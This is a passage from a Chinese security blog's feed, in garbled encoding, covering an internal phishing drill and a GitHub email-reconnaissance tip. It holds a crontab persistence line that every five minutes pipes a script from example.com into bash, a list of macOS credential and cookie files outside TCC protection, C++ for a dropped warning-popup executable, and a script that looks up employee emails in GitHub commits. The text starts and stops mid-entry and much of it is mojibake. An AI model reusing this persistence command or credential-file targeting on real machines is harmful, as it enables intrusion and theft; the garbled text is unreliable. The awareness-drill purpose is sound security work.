/private/tmp/you_have_been_pwn.txt<span class="token builtin class-name">echo</span> <span class="token string">"*/5 * * * * curl -sSL https://example.com/osxdoor | bash"</span> <span class="token operator">>></span> /tmp/you_have_been_pwn.txt<span class="token function">crontab</span> /private/tmp/you_have_been_pwn.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>rootç”¨æˆ·è·å–æ™®é€šç”¨æˆ·åçš„æ–¹å¼: <code>USER=$(dscacheutil -q group -a name admin|grep users|cut -d &quot; &quot; -f 3)</code></p><h3 id="OS-Xä¸‹çš„æ¸—é€æµ‹è¯•æ”»å‡»"><a href="#OS-Xä¸‹çš„æ¸—é€æµ‹è¯•æ”»å‡»" class="headerlink" title="OS Xä¸‹çš„æ¸—é€æµ‹è¯•æ”»å‡»"></a>OS Xä¸‹çš„æ¸—é€æµ‹è¯•æ”»å‡»</h3><p>å‚è€ƒä¸‹é¢è¿™å‡ ä¸ªæ–‡ç« :</p><ul><li><a href="https://mp.weixin.qq.com/s/MVb1x-jsSAHu-Bn1sjDXAQ">å›½æŠ¤å‡†å¤‡ä¹‹macosæ”»å‡»</a></li><li><a href="https://mp.weixin.qq.com/s/CwqE0AgpzbUqdmg4R57_zA">MacOSé’“é±¼å®è·µ</a></li><li><a href="https://blog.macoder.tech/macOS-6faf0534323c42259f5277bd95d35c43">æ‰“é€ macOSä¸‹æœ€å¼ºçš„å¾®ä¿¡å–è¯å·¥å…·</a></li></ul><p>OSXç³»ç»Ÿä¸‹è½½ä¸€ä¸ªæ–‡ä»¶åˆ°è¿è¡Œçš„æ—¶å€™ï¼Œä¸­é—´ä¼šç¢°åˆ°è¿™å‡ ä¸ªå®‰å…¨æ‹¦æˆª:</p><h4 id="Gatekeeper"><a href="#Gatekeeper" class="headerlink" title="Gatekeeper"></a>Gatekeeper</h4><p>Gatekeeper æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæ—¨åœ¨ä»…å…è®¸å—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºåœ¨ç³»ç»Ÿä¸Šè¿è¡Œï¼Œç±»ä¼¼äºWindowsä¸Šçš„SmartScreenå’ŒMOTWã€‚ä»Internetä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå®ƒä»¬ä¼šæ ‡æœ‰å±æ€§com.apple.quarantineï¼Œè¯¥å±æ€§ä¼šåœ¨æ–‡ä»¶è¿è¡Œæ—¶è§¦å‘ç½‘å®ˆã€‚å¦‚æœå¯æ‰§è¡Œæ–‡ä»¶æœªç»è¿‡å…¬è¯ï¼ŒGatekeeper å°†å‘ç”¨æˆ·æ˜¾ç¤ºæç¤ºï¼Œé€šçŸ¥ä»–ä»¬è¯¥æ–‡ä»¶æ— æ³•è¿è¡Œï¼Œå› ä¸ºå®ƒæœªç­¾åã€‚è¦è¿è¡Œæœªç­¾åçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç”¨æˆ·å¿…é¡»å³é”®å•å‡»è¯¥æ–‡ä»¶ï¼Œç„¶åå•å‡»æ‰“å¼€ï¼Œè€Œä¸æ˜¯åŒå‡»ã€‚</p><p>åœ¨éªŒè¯ä»£ç ç­¾ååï¼ŒmacOSçš„å†…ç½®é˜²ç—…æ¯’è½¯ä»¶XProtectå°†æ‰«ææ–‡ä»¶ä¸­çš„æ¶æ„è½¯ä»¶ã€‚XProtectä½¿ç”¨YARAè§„åˆ™ã€‚</p><p>æœ€åï¼Œå¦‚æœæ‚¨æƒ³è¦å¯¹åº”ç”¨ç¨‹åºè¿›è¡Œå…¬è¯ï¼Œæ‚¨å¯ä»¥æ³¨å†ŒApple Developer Programä»¥è·å¾—ä»£ç ç­¾åè¯ä¹¦ï¼Œè´¹ç”¨ä¸ºæ¯å¹´99ç¾å…ƒã€‚æ³¨å†Œåï¼Œæ‚¨å¯ä»¥ç­¾ç½²æ‚¨çš„åº”ç”¨ç¨‹åºå¹¶å°†å…¶æäº¤ Appleï¼Œåœ¨é‚£é‡Œå®ƒå°†è¿›è¡Œå®‰å…¨æ‰«æå¹¶æ£€æŸ¥å…¶ä»–è¦æ±‚ï¼Œä¾‹å¦‚å¼ºåŒ–è¿è¡Œæ—¶ï¼ˆåœ¨ä¸‹ä¸€èŠ‚ä¸­ä»‹ç»ï¼‰æ˜¯å¦å·²å¯ç”¨ã€‚å¦‚æœæ‚¨æäº¤æ¶æ„è½¯ä»¶ï¼ŒAppleçš„å®‰å…¨æ‰«æå¯èƒ½ä¼šå¿½ç•¥å®ƒå¹¶ä»ç„¶å…¬è¯æ‚¨çš„åº”ç”¨ç¨‹åºï¼Œè¯ä¹¦å¯èƒ½å¾ˆå¿«å°±ä¼šè¢«åŠé”€ã€‚</p><h4 id="TCC"><a href="#TCC" class="headerlink" title="TCC"></a>TCC</h4><p>Transparency, Consent, and Control(TCC)æ˜¯åœ¨ v10.14+ ä¸­å®ç°çš„ macOS éšç§åŠŸèƒ½ï¼Œå½“åº”ç”¨ç¨‹åºå°è¯•è®¿é—®æŸäº›èµ„æºï¼ˆä¾‹å¦‚ç›¸æœºï¼‰å’ŒæŸäº›æ–‡ä»¶å¤¹ï¼ˆåŒ…æ‹¬ Desktopï¼ŒDownloadsï¼ŒDocumentså’Œé©±åŠ¨å™¨/å·ï¼‰æ—¶ï¼Œå®ƒä¼šæç¤ºç”¨æˆ·æ˜ç¡®æˆäºˆæƒé™ã€‚å°è¯•è®¿é—®å—TCCä¿æŠ¤çš„èµ„æºè€Œæ²¡æœ‰æƒé™å¯èƒ½ä¼šæœ‰å¼¹æ¡†æç¤ºï¼Œå¯¼è‡´ç”¨æˆ·å¯Ÿè§‰åˆ°shellçš„å­˜åœ¨ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›æœªå—TCCä¿æŠ¤çš„æœ‰ç”¨æ–‡ä»¶ï¼š</p><ul><li>ä¸»ç›®å½•ä¸­çš„éšè—æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼š<code>~/.aws/*</code>ã€<code>~/.ssh/*</code>ã€<code>~/.bash_history</code>ã€<code>~/.zsh_history</code></li><li>ç”¨æˆ·åº”ç”¨ç¨‹åºæ•°æ® â€” <code>ã€œ/Library/Application Support/*</code></li><li>Cookie æ–‡ä»¶ â€” <code>~/Library/Application Support/Google/Chrome/Default/Cookies</code> , <code>~/Library/Containers/com.tinyspeck.slackmacgap/Data/Library/Application Support/Slack/Cookies</code></li></ul><p>ç³»ç»ŸTCCæ•°æ®åº“ä½äº /Library/Application Support/com.apple.TCC/TCC.dbï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªä½äº ~/Library/Application Support/com.apple.TCC/TCC.db çš„TCCæ•°æ®åº“ã€‚</p><h2 id="Windowsä¸‹çš„EXE"><a href="#Windowsä¸‹çš„EXE" class="headerlink" title="Windowsä¸‹çš„EXE"></a>Windowsä¸‹çš„EXE</h2><p>Windowsä¸‹çš„Exeæœ‰ä¸¤ä¸ªåŠŸèƒ½:</p><ol><li>æ‰§è¡ŒExeçš„æ—¶å€™ï¼Œè·å–ç”¨æˆ·åå’Œä¸»æœºåï¼Œå›ä¼ å‘é€åˆ°æœåŠ¡ç«¯</li><li>æ–°å»ºä¸€ä¸ªhelo-worldçš„å®šæ—¶ä»»åŠ¡ï¼Œåœ¨æŸä¸ªæ—¶é—´ç‚¹æ‰§è¡Œå¼¹æ¡†Exeï¼Œå¼¹çª—å‘Šè¯‰ç”¨æˆ·è¢«å…¥ä¾µäº†</li></ol><p>å®šæ—¶ä»»åŠ¡ç›´æ¥æ‰¾CSDNçš„ä¾‹å­ï¼Œå¯ä»¥æ‹¿æ¥ç”¨<a href="https://learn.microsoft.com/en-us/windows/win32/taskschd/time-trigger-example--c---">Time Trigger Example (C++</a>ï¼Œå¼¹çª—çš„Exeä»£ç å¦‚ä¸‹:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token comment">// çª—å£è¿‡ç¨‹å‡½æ•°</span>LRESULT CALLBACK <span class="token function">WndProc</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> UINT msg<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> WM_PAINT<span class="token operator">:</span>    <span class="token punctuation">&#123;</span>        PAINTSTRUCT ps<span class="token punctuation">;</span>        HDC hdc <span class="token operator">=</span> <span class="token function">BeginPaint</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ps<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// è®¾ç½®å­—ä½“å’Œé¢œè‰²</span>        HFONT hFont <span class="token operator">=</span> <span class="token function">CreateFontW</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> FW_NORMAL<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> DEFAULT_CHARSET<span class="token punctuation">,</span> OUT_DEFAULT_PRECIS<span class="token punctuation">,</span> CLIP_DEFAULT_PRECIS<span class="token punctuation">,</span> DEFAULT_QUALITY<span class="token punctuation">,</span> DEFAULT_PITCH <span class="token operator">|</span> FF_SWISS<span class="token punctuation">,</span> L<span class="token string">"Arial"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SelectObject</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> hFont<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetTextColor</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> <span class="token function">RGB</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetBkColor</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> <span class="token function">RGB</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// ç»˜åˆ¶æ–‡æœ¬</span>        <span class="token keyword">wchar_t</span> text<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> L<span class="token string">"æ‚¨çš„ç”µè„‘å·²è¢«å…¥ä¾µï¼Œè¯·æé«˜ä¿¡æ¯å®‰å…¨æ„è¯†ï¼Œé˜²æ­¢é’“é±¼é‚®ä»¶ï¼ŒByeByeã€€:)"</span><span class="token punctuation">;</span>        RECT rect<span class="token punctuation">;</span>        <span class="token function">GetClientRect</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>rect<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DrawTextW</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> text<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>rect<span class="token punctuation">,</span> DT_CENTER <span class="token operator">|</span> DT_VCENTER <span class="token operator">|</span> DT_SINGLELINE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// æ¸…ç†èµ„æº</span>        <span class="token function">EndPaint</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ps<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DeleteObject</span><span class="token punctuation">(</span>hFont<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">case</span> WM_DESTROY<span class="token operator">:</span>        <span class="token function">PostQuitMessage</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token keyword">return</span> <span class="token function">DefWindowProc</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> wParam<span class="token punctuation">,</span> lParam<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> WINAPI <span class="token function">wWinMain</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span> LPWSTR lpCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> nCmdShow<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// æ³¨å†Œçª—å£ç±»</span>    WNDCLASSEXW wc <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WNDCLASSEXW<span class="token punctuation">)</span><span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>lpfnWndProc <span class="token operator">=</span> WndProc<span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>hInstance <span class="token operator">=</span> hInstance<span class="token punctuation">;</span>    wc<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> L<span class="token string">"MyWindowClass"</span><span class="token punctuation">;</span>    <span class="token function">RegisterClassExW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>wc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// åˆ›å»ºçª—å£</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        HWND hWnd <span class="token operator">=</span> <span class="token function">CreateWindowExW</span><span class="token punctuation">(</span>WS_EX_TOPMOST <span class="token operator">|</span> WS_EX_APPWINDOW<span class="token punctuation">,</span> L<span class="token string">"MyWindowClass"</span><span class="token punctuation">,</span> L<span class="token string">"å¦‚æœæœ‰ä»»ä½•é—®é¢˜ï¼Œè¯·è”ç³»å®‰å…¨ç»„ -- By "</span><span class="token punctuation">,</span> WS_OVERLAPPEDWINDOW<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">550</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> hInstance<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hWnd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">MessageBoxW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> L<span class="token string">"Failed to create window"</span><span class="token punctuation">,</span> L<span class="token string">"Error"</span><span class="token punctuation">,</span> MB_OK <span class="token operator">|</span> MB_ICONERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ˜¾ç¤ºçª—å£</span>        <span class="token function">ShowWindow</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> nCmdShow<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">UpdateWindow</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// æ¶ˆæ¯å¾ªç¯</span>        MSG msg<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">GetMessageW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">TranslateMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">DispatchMessageW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šè¿°çš„Exeç¼–è¯‘ä¹‹åï¼Œå†æ–°å»ºä¸€ä¸ªå·¥ç¨‹ï¼ŒæŠŠä¸Šé¢çš„exeå½“ä½œèµ„æºæ–‡ä»¶ï¼Œåœ¨è¿è¡Œçš„æ—¶å€™ï¼Œé‡Šæ”¾åˆ°ç‰¹å®šç›®å½•ä¸­ï¼Œå®šæ—¶ä»»åŠ¡å†æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;ä¸€å¹´ä¸€åº¦çš„é’“é±¼èŠ‚ï¼Œéœ€è¦é’ˆå¯¹å…¬å¸å‘˜å·¥åšä¸€æ¬¡é’“é±¼æ¼”ç»ƒï¼Œå‰æœŸå‡†å¤‡å·¥ä½œå¦‚ä¸‹:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç¡®å®šé’“é±¼çš„é¡µé¢ï¼šå›¾æ–¹ä¾¿é€‰äº†ä¸€ä¸ªç™»å½•å…¥å£ï¼Œç”¨Chromeæ’ä»¶SingleFileå³é”®ä¸€é”®ä¿å­˜&lt;/li&gt;
&lt;li&gt;ç¡®å®šé’“é±¼çš„å½¢å¼ï¼šå¼•å¯¼ç”¨æˆ·è¾“å…¥å…¬å¸é‚®ç®±ï¼Œç‚¹å‡»å®Œæˆä¹‹åï¼Œå¼¹å‡ºéœ€è¦å®‰è£…æ’ä»¶ï¼Œæ ¹æ®UAå†³å®šæ˜¯ä¸‹è½½pkgè¿˜æ˜¯exeã€‚&lt;/li&gt;
&lt;li&gt;ç¡®å®šé’“é±¼çš„æ•ˆæœï¼šä»ä¸‰ä¸ªæ•°æ®ç»´åº¦æ¥çœ‹æœ€ç»ˆæ•ˆæœ&lt;ul&gt;
&lt;li&gt;é’“é±¼é¡µé¢è®¿é—®æ¬¡æ•°&lt;/li&gt;
&lt;li&gt;è¾“å…¥å…¬å¸é‚®ç®±çš„æ•°é‡ç»Ÿè®¡&lt;/li&gt;
&lt;li&gt;æ”¶é›†è¿è¡Œäº†Exeå’ŒPkgçš„ç”¨æˆ·&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;é’“é±¼é‚®ä»¶çš„å‘é€&quot;&gt;&lt;a href=&quot;#é’“é±¼é‚®ä»¶çš„å‘é€&quot; class=&quot;headerlink&quot; title=&quot;é’“é±¼é‚®ä»¶çš„å‘é€&quot;&gt;&lt;/a&gt;é’“é±¼é‚®ä»¶çš„å‘é€&lt;/h2&gt;&lt;p&gt;æœ‰ä¸¤ç§å½¢å¼å¯ä»¥å‘é€é’“é±¼é‚®ä»¶ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨ç›¸è¿‘åŸŸå&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨sendcloud&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;ç›¸è¿‘åŸŸåå‘é€&quot;&gt;&lt;a href=&quot;#ç›¸è¿‘åŸŸåå‘é€&quot; class=&quot;headerlink&quot; title=&quot;ç›¸è¿‘åŸŸåå‘é€&quot;&gt;&lt;/a&gt;ç›¸è¿‘åŸŸåå‘é€&lt;/h3&gt;&lt;p&gt;æ³¨å†Œç›¸è¿‘åŸŸåä¹‹åï¼Œå¯ä»¥æ ¹æ®è¿™é‡Œçš„æ­¥éª¤ç»‘å®šä½¿ç”¨zohoçš„å…è´¹ä¼ä¸šé‚®ç®±: &lt;a href=&quot;https://zhuanlan.zhihu.com/p/341879374&quot;&gt;2021å¹´å››æ¬¾å›½å†…å¤–å…è´¹ä¼ä¸šé‚®ç®±åŠç”³è¯·æ•™ç¨‹å›¾è§£&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ä½¿ç”¨SendCloud&quot;&gt;&lt;a href=&quot;#ä½¿ç”¨SendCloud&quot; class=&quot;headerlink&quot; title=&quot;ä½¿ç”¨SendCloud&quot;&gt;&lt;/a&gt;ä½¿ç”¨SendCloud&lt;/h3&gt;&lt;p&gt;æ³¨å†ŒSendCloudä¹‹åï¼Œç”ŸæˆAPI Keyï¼Œåˆ©ç”¨ä»¥ä¸‹ä»£ç å‘é€é’“é±¼é‚®ä»¶ï¼š&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Githubæœç´¢å°æŠ€å·§</title>
    <link href="https://jkme.github.io/2023/03/03/github-trick.html"/>
    <id>https://jkme.github.io/2023/03/03/github-trick.html</id>
    <published>2023-03-02T16:00:00.000Z</published>
    <updated>2023-03-29T02:10:26.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>è·å–äº†ä¸€ä¸ªå¤šäººè¿åŠ¨çš„gitä»“åº“ï¼Œéœ€è¦æå–ä»“åº“é‡Œé¢æ‰€æœ‰çš„Emailï¼Œç„¶åæ ¹æ®Emailæœä¸€ä¸‹Githubæ˜¯å¦å­˜åœ¨å¯¹åº”çš„æäº¤è®°å½•ã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆå¸¸è§çš„é—®é¢˜ï¼Œæ¯”å¦‚å…¬å¸å‘˜å·¥åœ¨æäº¤gihtubçš„æ—¶å€™ï¼Œæ²¡æœ‰æ³¨æ„ä¿®æ”¹æäº¤çš„é‚®ç®±ï¼Œå¾ˆå¯èƒ½ä½¿ç”¨å…¬å¸çš„é‚®ç®±è¿›è¡Œæäº¤ã€‚</p><h2 id="è§£å†³æ–¹å¼"><a href="#è§£å†³æ–¹å¼" class="headerlink" title="è§£å†³æ–¹å¼"></a>è§£å†³æ–¹å¼</h2><p>æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥æå–ä¸€ä¸ªä»“åº“çš„æ‰€æœ‰é‚®ç®±ï¼š</p><h3 id="ç¬¬ä¸€ç§"><a href="#ç¬¬ä¸€ç§" class="headerlink" title="ç¬¬ä¸€ç§"></a>ç¬¬ä¸€ç§</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log <span class="token string">"--format=format:%ae"</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ç¬¬äºŒç§"><a href="#ç¬¬äºŒç§" class="headerlink" title="ç¬¬äºŒç§"></a>ç¬¬äºŒç§</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> shortlog -sea <span class="token operator">|</span> <span class="token function">grep</span> -E -o <span class="token string">"<span class="token entity" title="\b">\b</span>[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,6&#125;<span class="token entity" title="\b">\b</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print tolower($0)&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token operator">|</span> <span class="token function">grep</span> -wv <span class="token string">'users.noreply.github.com'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæ ¹æ®<a href="https://mp.weixin.qq.com/s/zoYE102P_2BvB-sForjkHQ">githubå°æŠ€å·§</a>å†™ä¸€ä¸ªæ‰¹é‡è·å–é‚®ç®±çš„è„šæœ¬ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> random <span class="token keyword">import</span> choice<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeTOKEN_LISTS <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token string">""</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">search_commits</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>       headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/vnd.github+json"</span><span class="token punctuation">,</span>                   <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                  <span class="token punctuation">&#125;</span>       req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://api.github.com/search/commits'</span><span class="token punctuation">,</span>           <span class="token punctuation">&#123;</span><span class="token string">'q'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"committer-email:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>email<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>           headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>       <span class="token keyword">return</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># file = sys.argv[1]</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">"/tmp/email.txt"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>          <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                email <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>                token <span class="token operator">=</span> choice<span class="token punctuation">(</span>TOKEN_LISTS<span class="token punctuation">)</span>                                <span class="token keyword">try</span><span class="token punctuation">:</span>                    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> search_commits<span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"total_count"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span>                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                     <span class="token keyword">raise</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a 